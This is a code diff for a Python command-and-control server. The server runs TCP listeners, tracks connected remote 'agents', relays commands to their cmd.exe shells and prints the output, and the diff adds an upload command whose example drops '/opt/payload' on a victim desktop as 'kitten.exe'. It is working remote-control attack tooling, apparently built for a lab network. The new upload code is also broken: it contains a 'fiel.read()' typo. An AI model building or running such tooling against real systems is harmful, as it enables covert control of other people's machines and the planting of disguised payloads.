@@ -9,49 +9,61 @@ from os.path import join
 import hashlib
 import random
 import inspect
+import base64
 
 # Overview:
 #  main > handles arguments, starts Terminal thread
-#  CommandThread - 
+#  Server Terminal - 
 #       allows to chose agent (from Global dictionary of queues!), 
 #           send command to this agent
 #           allow to enter shell mode
 #       allows to start listener
 #  listener >
 #       creates listening socket, 
-#       starts Client Threads, 
+#       starts Agent Handler Threads, 
 #       creates and assigns every thread a separate queue
 #       enter this queue into Global dict
-#  Client Thread - as now
+#  Agent Handler - as now
 
 
 def main():
+    ClientDict = {}
     responseq = queue.Queue()
-    terminal = Terminal(Listeners,ClientDict,responseq)
+    Listeners = []
+
+    # Search for Classes with '*listener*' pattern in name
+    members = inspect.getmembers(sys.modules[__name__])
+    for i in range(len(members)):
+        if 'listener' in members[i][0]:
+            Listeners.append(members[i])
+    # Call Listener class as:
+    #   new_listener = Listeners[i][1]("192.168.56.112",8008)
+    #   new_listener.start()
+    
+    terminal = ServerTerminal(Listeners,ClientDict,responseq)
     terminal.cmdloop()
 
 
-class Terminal(Cmd):
+class ServerTerminal(Cmd):
     def __init__(self,Listeners,ClientDict,RespQueue):
         Cmd.__init__(self)
         self.lport = 8008
         self.lhost = "0.0.0.0"
         self.listeners = Listeners
         self.ClientDict = ClientDict
+        self.rq = RespQueue
+        self.prompt = '$ '
         self.shell = False
         self.q = None
         self.agent = None
         self.parentagent = None
-        self.prompt = '$ '
         self.tokill = ''
-        self.rq = RespQueue
 
     def help_interact(self):
         print("interact <agent_id>")
         print("To view available agents, use: list agents")
 
     def do_interact(self,args):
-
         # if only one agent connected - interact with it
         if len(self.ClientDict) == 1:
             self.agent = list(self.ClientDict.keys())[0]
@@ -79,7 +91,9 @@ class Terminal(Cmd):
             
             # For now shell is implemented in separate connection
             # Sleep while shell connection is created
-            time.sleep(1)
+            current_clients = len(self.ClientDict.keys())
+            while len(self.ClientDict.keys()) < current_clients+1:
+                time.sleep(0.5)
 
             # Parsing last agent ID from ClientDict
             self.parentagent = self.agent
@@ -87,7 +101,7 @@ class Terminal(Cmd):
             self.parentip = self.ClientDict[self.parentagent][0][0]
             self.shellip = self.ClientDict[self.agent][0][0] 
 
-            # Really rude check if that's shell agent... =_=
+            # Really rude check if this indeed is shell agent (if from same host)... =_=
             if self.parentip == self.shellip \
                 and len(self.ClientDict.keys()) > 1:
                 
@@ -226,7 +240,29 @@ class Terminal(Cmd):
         print('\tlport <port>')
         print('\tlhost <IP>')
         print('\t\tExample: set lhost 192.168.56.112')
-        
+
+    def do_upload(self,args):
+        if (len(args.split(' ')) != 2):
+            self.help_upload()
+        else:
+            localfile = args.split(' ')[0]
+            remotefile = args.split(' ')[1]
+
+            try:
+                with open(localfile,'r') as file:
+                    filedata = fiel.read()
+            except FileNotFoundError:
+                print('[-] Local file specified not found')
+            except Exception as ex:
+                print("[-] Unhandled Exception while reading file: {}".format(ex))
+
+            b64filedata = base64.b64encode(filedata.encode())
+            print(b64filedata)
+
+    def help_upload(self):
+        print('upload <local_fs_file> <remote_fs_file>')
+        print('Example:\n\tupload /opt/payload C:\users\ieuser\desktop\kitten.exe')
+
     def emptyline(self):
         if self.q == None:
             pass
@@ -267,8 +303,8 @@ class listener_tcp(threading.Thread):
             (client, client_address) = server.accept()
             q = queue.Queue()
             
-            # Any agent connection goes in BotHandler threading class.
-            newthread = BotHandler(client, client_address, q, self.rq)
+            # Any agent connection goes in AgentHandler threading class.
+            newthread = AgentHandler(client, client_address, q, self.rq)
             
             randName = hashlib.sha1(hex(random.randrange(100000,200000)).split('0x')[1].encode('utf-8')).hexdigest()
             newthread.setName(str(randName))
@@ -277,7 +313,7 @@ class listener_tcp(threading.Thread):
             ClientDict[randName] = (client_address, q)
 
 
-class BotHandler(threading.Thread):
+class AgentHandler(threading.Thread):
     def __init__(self, client, client_address, myqueue, ResponseQueue):
         threading.Thread.__init__(self)
         self.client = client
@@ -315,26 +351,25 @@ class BotHandler(threading.Thread):
 
         # Command loop
         while True:
-            RecvBotCmd = self.q.get()
-            #print("len(RecvBotCmd): {}".format(len(RecvBotCmd)))
+            RecvCmd = self.q.get()
             try:
-                self.client.send(RecvBotCmd.encode('utf-8'))
+                self.client.send(RecvCmd.encode('utf-8'))
                 cmd_response = ""
                 while True:
                     try:
-                        if "\n" == RecvBotCmd:
+                        if "\n" == RecvCmd:
                             self.client.settimeout(0.1)
                         
                         # long taking commands
                         # add if some output notfully 
                         # reveived in this while loop
-                        elif "ping" in RecvBotCmd:
+                        elif "ping" in RecvCmd:
                             self.client.settimeout(5)
                         
                         # cmd.exe shell returns input
                         # if response not longer than command
                         # then command is still executing
-                        elif (len(cmd_response) <= len(RecvBotCmd)):
+                        elif (len(cmd_response) <= len(RecvCmd)):
                             self.client.settimeout(5)
                         
                         else:
@@ -358,10 +393,10 @@ class BotHandler(threading.Thread):
                     else:
                         cmd_response += recv
                 
-                #print("Len response {}".format(len(cmd_response)))
-                # Removing sent command from response before printing output
+                # If there's command response - show it
                 if len(cmd_response.strip()) > 1:
-                    print(cmd_response.replace(RecvBotCmd,""))
+                    # Removing sent command from response before printing output
+                    print(cmd_response.replace(RecvCmd,""))
             
             except Exception as ex:
                 print("[-] Exception occured while sending command: {}".format(ex))
@@ -370,17 +405,4 @@ class BotHandler(threading.Thread):
 
 
 if __name__ == '__main__':
-    
-    ClientDict = {}
-    Listeners = []
-
-    # Search for Classes with '*listener*' pattern in name
-    members = inspect.getmembers(sys.modules[__name__])
-    for i in range(len(members)):
-        if 'listener' in members[i][0]:
-            Listeners.append(members[i])
-    # Should call Listener class as:
-    #   new_listener = Listeners[i][1]("192.168.56.112",8008)
-    #   new_listener.start()
-    
     main()
